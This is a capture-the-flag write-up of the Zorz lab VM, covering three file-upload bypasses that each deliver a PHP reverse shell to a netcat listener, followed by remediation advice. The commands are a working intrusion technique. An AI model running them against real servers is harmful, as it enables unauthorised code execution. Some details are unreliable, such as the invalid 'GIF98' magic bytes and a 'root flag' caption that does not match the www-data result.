# TopHatSec: Zorz — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.129 |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Goal** | Upload a web shell to all three upload challenge pages |
| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-zorz-vm-ctf-challenge/) |

## Attack Summary

Three progressively filtered file upload forms on a single web server, each bypassed with a renamed/magic-byte-prepended PHP reverse shell; all three result in netcat sessions.

## Methodology

1. Recon — nmap scan for open ports
2. Enumeration — dirb to find upload directories
3. Exploitation — file upload bypass (extension rename, magic bytes, no validation)
4. Post-Exploitation — netcat shell from each challenge level

## Step 1: Reconnaissance

Discover the target on the local network with netdiscover, then confirm open ports.

```bash
netdiscover -r 192.168.1.0/24
```

```bash
nmap -A -p- $TARGET
```

![nmap scan](images/01-nmap.png)

Ports open: **22** (SSH) and **80** (HTTP).

## Step 2: Web Enumeration

Visit `http://$TARGET` in a browser. The landing page shows three separate "Image Uploader" challenges linked from the navigation. Each is a distinct web page with its own upload form.

Run dirb to identify where uploads land:

```bash
dirb http://$TARGET /usr/share/dirb/wordlists/big.txt
```

![dirb scan](images/02-dirb.png)

Directories found: `/uploads1`, `/uploads2`, `/uploads3`.

## Step 3: Level 1 — Extension Rename

The first form accepts any file. Prepare a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.jpg
# Edit LHOST and LPORT inside the file before saving
```

Start a listener on the attacker machine:

```bash
nc -lvnp 1234
```

Upload `php-reverse-shell.jpg` through the Level 1 form. Browse to `/uploads1/php-reverse-shell.jpg` to trigger execution.

Shell lands in the listener.

## Step 4: Level 2 — Magic Bytes Bypass

The second form validates the file signature. Add the GIF magic bytes to the top of the PHP file and rename with a double extension:

```bash
echo 'GIF98' | cat - /usr/share/webshells/php/php-reverse-shell.php > php-reverse-shell.php.jpg
# Ensure LHOST/LPORT are set inside the file
```

Upload `php-reverse-shell.php.jpg` through the Level 2 form. Browse to `/uploads2/php-reverse-shell.php.jpg`.

```bash
nc -lvnp 1234
```

![level 2 shell](images/03-level2-shell.png)

Second netcat session obtained.

## Step 5: Level 3 — No Server-Side Validation

The third form displays a note about accepting only `.jpeg`, `.jpg`, `.png` files under 100 KB, but performs no server-side enforcement. Upload the original `php-reverse-shell.php` without modification.

Browse to `/uploads3/php-reverse-shell.php`.

```bash
nc -lvnp 1234
```

![level 3 shell](images/04-level3-shell.png)

Third netcat session obtained.

## Step 6: Result

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![root flag](images/05-root-flag.png)

All three upload challenges defeated. The VM's goal is achieving code execution through all three forms rather than reading a traditional root flag file.

## Lessons Learned

1. Renaming a PHP file to `.jpg` is insufficient protection against malicious uploads if the server executes based on the uploaded name rather than the detected MIME type.
2. Magic-byte checks are bypassable by prepending the expected header bytes before a valid PHP payload.
3. Client-side file-type restrictions (only `.jpg`/`.png`) are trivially bypassed: all validation must occur server-side.
4. A web server should store uploaded files outside the document root and serve them through a controller that cannot execute arbitrary scripts.

## Remediation

| Vulnerability | Fix |
|---|---|
| Extension-only validation | Validate MIME type server-side using `fileinfo` or equivalent |
| Magic-byte bypass | Combine MIME detection with file re-encoding (e.g., re-save images through GD) |
| Executable uploads | Store files outside the web root; never permit PHP execution in upload directories |
| Missing `Content-Disposition` headers | Add `X-Content-Type-Options: nosniff` and disable script execution in upload directories via `.htaccess` or server config |
